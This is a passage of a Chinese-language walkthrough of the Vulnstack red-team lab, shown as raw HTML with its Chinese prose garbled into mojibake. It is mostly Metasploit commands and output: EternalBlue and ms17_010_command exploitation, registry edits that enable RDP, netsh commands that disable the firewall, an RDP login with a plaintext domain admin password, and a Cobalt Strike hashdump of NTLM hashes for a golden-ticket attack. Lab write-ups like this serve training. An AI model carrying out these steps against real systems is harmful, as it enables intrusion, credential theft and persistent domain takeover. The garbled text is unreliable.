<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">135</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">80</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">139</span> - TCP OPEN\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>å­˜åœ¨ <code>80</code>ï¼Œ<code>136</code>ï¼Œ<code>139</code>ï¼Œ<code>445</code></p>\n</li>\n<li>\n<p>ç«Ÿç„¶è¿˜å­˜åœ¨<code>80</code>ç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¹‹å‰è·å¾—çš„<code>RDP</code> åœ¨<code>win7</code>é‡Œé¢è®¿é—®ï¼Œæ˜¯é»˜è®¤é¡µé¢</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image10.png\" alt=\"image.png\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3>å°è¯•æ°¸æ’ä¹‹è“</h3>\n<ol>\n<li>\n<p>ä¸¤å°æœºå­éƒ½å­˜åœ¨<code>445</code>ç«¯å£ï¼Œæ°¸æ’ä¹‹è“æ¼æ´è‚¯å®šæ˜¯è¦å°è¯•çš„</p>\n</li>\n<li>\n<p>é¦–å…ˆä½¿ç”¨æ¢æµ‹æ¨¡å—æ¢æµ‹æ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“<code>ms17-010</code></p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 auxiliary(scanner/smb/smb_ms17_010) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span> x86 (<span class=\"hljs-number\">32</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_ms17_010) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2008</span> R2 Datacenter <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span> x64 (<span class=\"hljs-number\">64</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>éƒ½æ˜¯å¯èƒ½å­˜åœ¨ï¼Œä¸ç®¡å¦‚ä½•éƒ½è¯•è¯•</p>\n</li>\n<li>\n<p>ä½¿ç”¨æ°¸æ’ä¹‹è“æ”»å‡»é¶æœº</p>\n<p>psï¼špayloadéœ€è¦æŒ‡å®šä¸ºæ­£å‘è¿æ¥ï¼Œå› ä¸ºæ˜¯åœ¨å†…ç½‘ç¯å¢ƒï¼Œé¶æœºæ²¡æœ‰é€šå‘æ”»å‡»æœºçš„è·¯ç”±</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter/bind_tc\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 <span class=\"hljs-keyword\">as</span> check\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2008</span> R2 Datacenter <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span> x64 (<span class=\"hljs-number\">64</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - The target <span class=\"hljs-keyword\">is</span> vulnerable.\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - Connecting to target <span class=\"hljs-keyword\">for</span> exploitation.\n[-] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - SMB Negotiation Failure -- this often occurs when lsass crashes.  The target may reboot <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">60</span> seconds.\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">4444</span>\n[*] Exploit completed, but no session was created.\n</code></pre>\n<p>å¤±è´¥ï¼ŒåŸŸæ§æ²¡æœ‰æ‹¿åˆ°shell</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(windows/smb/ms17_010_eternalblue) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 <span class=\"hljs-keyword\">as</span> check\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span> x86 (<span class=\"hljs-number\">32</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - The target <span class=\"hljs-keyword\">is</span> vulnerable.\n[-] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Exploit aborted due to failure: no-target: This module only supports x64 (<span class=\"hljs-number\">64</span>-bit) targets\n[*] Exploit completed, but no session was created.\n</code></pre>\n<p>æç¤ºè¯¥æ¨¡å—ä»…æ”¯æŒ<code>x64</code>ï¼Œä½†æ˜¯é¶æœºæ˜¯<code>x32</code>çš„ï¼Œæ¢äº†<code>ms17_010_psexec</code> ï¼Œä½†æ˜¯shellæ­»æ´»è¿ä¸ä¸Š</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(windows/smb/ms17_010_psexec) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Target OS: Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Filling barrel <span class=\"hljs-keyword\">with</span> fish... done\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - &#x3C;---------------- | Entering Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -        [*] Preparing dynamite...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -                Trying stick <span class=\"hljs-number\">1</span> (x64)...Miss\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -                [*] Trying stick <span class=\"hljs-number\">2</span> (x86)...Boom!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -        [+] Successfully Leaked Transaction!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -        [+] Successfully caught Fish-<span class=\"hljs-keyword\">in</span>-a-barrel\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - &#x3C;---------------- | Leaving Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Reading <span class=\"hljs-keyword\">from</span> CONNECTION struct at: <span class=\"hljs-number\">0x8d666d60</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Built a write-what-where primitive...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Overwrite complete... SYSTEM session obtained!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Selecting native target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Uploading payload... xxjxkZjL.exe\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Created \\xxjxkZjL.exe...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Service started successfully...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Deleting \\xxjxkZjL.exe...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">4444</span>\n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\n[-] Meterpreter session <span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> valid <span class=\"hljs-keyword\">and</span> will be closed\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span> - Meterpreter session <span class=\"hljs-number\">3</span> closed.  Reason: Died\n</code></pre>\n</li>\n</ol>\n<h3>å°è¯•ms17_010_command</h3>\n<p>å› ä¸ºåŸŸæˆå‘˜<code>141</code>æ˜¯<code>32</code>ä½çš„ï¼ŒMSFçš„æ°¸æ’ä¹‹è“ä»…æ”¯æŒ<code>x64</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¢ä¸€ä¸ªå…¨ç‰ˆæœ¬çš„ï¼Œä»…ç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use auxiliary/admin/smb/ms17_010_command \nmsf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Target OS: Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span>                                          \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Filling barrel <span class=\"hljs-keyword\">with</span> fish... done                                             \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Entering Danger Zone | ---------------->                 \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [*] Preparing dynamite...                                                \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             Trying stick <span class=\"hljs-number\">1</span> (x64)...Miss                                      \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             [*] Trying stick <span class=\"hljs-number\">2</span> (x86)...Boom!                                 \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully Leaked Transaction!                                     \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully caught Fish-<span class=\"hljs-keyword\">in</span>-a-barrel                                 \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Leaving Danger Zone | ---------------->                  \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Reading <span class=\"hljs-keyword\">from</span> CONNECTION struct at: <span class=\"hljs-number\">0x8d66dd60</span>                                \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Built a write-what-where primitive...                                        \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Overwrite complete... SYSTEM session obtained!                               \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Getting the command output...                                                \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Executing cleanup...    \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Cleanup was successful                                                       \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Command completed successfully!                                              \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"net group \"</span>Domain Admins<span class=\"hljs-string\">\" /domain\"</span>:                              \n\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.                                 \n\nGroup name     Domain Admins                        \nComment        ???????                              \n\nMembers                                             \n\n-------------------------------------------------------------------------------                          \nAdministrator            OWA$                                                                            \nThe command completed successfully.                 \n</code></pre>\n<p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†ï¼Œæˆ‘ä»¬æ¢ä¸€æ¡å‘½ä»¤ï¼Œå°†å…¶è¿œç¨‹æ¡Œé¢æœåŠ¡æ‰“å¼€</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> command <span class=\"hljs-string\">'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Target OS: Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Filling barrel <span class=\"hljs-keyword\">with</span> fish... done\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Entering Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [*] Preparing dynamite...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             Trying stick <span class=\"hljs-number\">1</span> (x64)...Miss\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             [*] Trying stick <span class=\"hljs-number\">2</span> (x86)...Boom!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully Leaked Transaction!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully caught Fish-<span class=\"hljs-keyword\">in</span>-a-barrel\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Leaving Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Reading <span class=\"hljs-keyword\">from</span> CONNECTION struct at: <span class=\"hljs-number\">0x8d1c0d60</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Built a write-what-where primitive...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Overwrite complete... SYSTEM session obtained!\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Getting the command output...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Executing cleanup...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Cleanup was successful\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Command completed successfully!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\"</span> <span class=\"hljs-string\">\"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\"</span>:\n\nThe operation completed successfully.\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n</code></pre>\n<p>æˆåŠŸæ‰“å¼€ï¼Œå°è¯•è¿æ¥ï¼Œä½¿ç”¨<code>rdesktop</code> ,ç”¨æˆ·å°±ç”¨å¾—åˆ°çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥è‡ªå·±æ–°å»ºï¼ˆå›¾ç‰‡ä¸Šçš„å¯†ç å…¶å®æ˜¯<code>hongrisec@2019</code>çš„ï¼‰</p>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span> -p hongrisec@<span class=\"hljs-number\">2019</span> -u administrator\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image11.png\" alt=\"image.png\"></p>\n<p>ç™»é™†æˆåŠŸï¼Œæ‹¿ä¸‹<code>141</code> ï¼ŒåŸŸæ§å°è¯•èƒ½ä¸èƒ½ä¹Ÿæ‹¿ä¸‹äº†,è®°å¾—å…³é˜²ç«å¢™</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> command <span class=\"hljs-string\">'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> command <span class=\"hljs-built_in\">set</span> command netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n</code></pre>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.38</span> -p hongrisec@<span class=\"hljs-number\">2019</span> -u administrator\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image12.png\" alt=\"image.png\"></p>\n<p>ä¹Ÿæ˜¯å¯ä»¥æ‹¿ä¸‹çš„ï¼Œä½†æ˜¯ç”¨æˆ·ä¸å­˜åœ¨ADåŸŸçš„æ–‡ä»¶å’Œ<code>ad</code>åŸŸç®¡ç†å™¨ï¼Œä½†ç¡®å®æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œä¹Ÿç®—æ˜¯æ‹¿ä¸‹åŸŸæ§äº†</p>\n<h2>æƒé™ç»´æŒï¼ˆé»„é‡‘ç¥¨æ®ï¼‰</h2>\n<p>é»„é‡‘ç¥¨æ®æ˜¯æŒ‡èƒ½å¤Ÿç»•è¿‡è®¤è¯æˆæƒï¼ˆAuthentication and Authorizationï¼‰æœºåˆ¶å¹¶è·å¾—æ‰€éœ€æƒé™çš„ç¥¨æ®ã€‚</p>\n<ol>\n<li>\n<p>ç°åœ¨å·²ç»è·å¾—åŸŸçš„æƒé™äº†</p>\n</li>\n<li>\n<p>æˆ‘ä»¬è¦æ”¶é›†åŸŸåç§°ï¼ŒåŸŸç®¡ç†å‘˜è´¦æˆ·<code>SID</code>ï¼Œ<code>krbtgt</code>è´¦æˆ·çš„<code>HTLM</code>çš„<code>HASH</code> ï¼ˆé‡è¦ï¼‰</p>\n</li>\n<li>\n<p>è·å–åŸŸSIDä»¥åŠåŸŸåç§°</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image13.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image14.png\" alt=\"image.png\"></p>\n<p>åŸŸåç§°<code>god.org</code> ,<code>SID</code>ä¸º<code>S-1-5-21-2952760202-1353902439-2381784089</code> åé¢çš„<code>500</code>ä¸éœ€è¦</p>\n</li>\n<li>\n<p>è·å–<code>KRBTGT</code> çš„<code>NTLM</code>çš„<code>HASH</code></p>\n<p>æˆ‘è¿™é‡Œä½¿ç”¨<code>CS</code>æŠ“å–</p>\n<pre><code class=\"hljs language-python\">beacon> hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: <span class=\"hljs-number\">82541</span> <span class=\"hljs-built_in\">bytes</span>\n[+] received password hashes:\nAdministrator:<span class=\"hljs-number\">500</span>:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::\nGuest:<span class=\"hljs-number\">501</span>:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:<span class=\"hljs-number\">502</span>:aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::\nliukaifeng01:<span class=\"hljs-number\">1000</span>:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::\nligang:<span class=\"hljs-number\">1106</span>:aad3b435b51404eeaad3b435b51404ee:1e3d22f88dfd250c9312d21686c60f41:::\nOWA$:<span 